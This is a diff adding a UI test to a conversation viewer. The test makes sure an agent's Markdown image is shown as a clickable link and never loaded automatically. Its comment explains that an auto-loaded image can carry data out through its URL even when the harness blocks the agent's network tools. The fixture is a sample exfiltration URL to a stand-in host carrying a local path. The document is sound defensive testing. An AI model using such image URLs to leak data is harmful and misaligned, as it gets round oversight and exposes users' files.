@@ -80,6 +80,21 @@ describe('ConversationView', () => {
     expect(link.getAttribute('target')).toBe('_blank');
   });
 
+  /**
+   * REV3: a Markdown IMAGE is not raw HTML, so the test above never saw it. Rendered, it is a request
+   * the page makes with no click — whatever an agent puts in the URL leaves the machine, even when
+   * its harness's own network tools are refused (D47 §4, D52). It is a link now, to be opened on
+   * purpose.
+   */
+  it('never loads an agent\'s Markdown image — it is a link a person may choose to open', () => {
+    view([ev({ kind: 'message', text: '![build log](https://example.invalid/p.png?d=C%3A%5Cwork)' })]);
+
+    expect(document.querySelector('img')).toBeNull();
+    const link = screen.getByRole('link', { name: /build log/ });
+    expect(link.getAttribute('target')).toBe('_blank');
+    expect(link.getAttribute('href')).toBe('https://example.invalid/p.png?d=C%3A%5Cwork');
+  });
+
   it('highlights a fenced block in its language, names it, and offers a copy', () => {
     const { container } = view([ev({ kind: 'message', text: '```rust\nlet cap = 4;\n```' })]);
 
